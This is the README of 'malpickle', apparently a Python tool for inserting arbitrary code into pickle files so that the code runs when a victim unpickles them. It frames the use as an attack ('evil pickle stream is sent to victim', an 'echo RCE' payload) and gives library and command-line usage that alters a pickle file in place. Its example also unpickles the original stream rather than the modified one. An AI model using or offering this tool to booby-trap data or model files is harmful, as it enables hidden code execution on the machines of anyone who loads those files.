# malpickle
Insert code into pickles

How to use as a library:

    code = "echo RCE"
    evil_pickle_stream = malpickle.insert_code(code, pickle_stream)

    # evil pickle stream is sent to victim
    # victim unpickles stream
    data = pickle.loads(pickle_stream) # echos RCE, data is unaffected

How to use as a program:

    python -m malpickle.main pickle_file code_file

This modifies pickle_file in place, adding a copy of the code from code_file.

When unpickled, pickle_file will execute the attached code.


# Dependencies
None!

# Installation

- Download the contents of the repo and run `python setup.py install` (using `sudo` if appropriate)
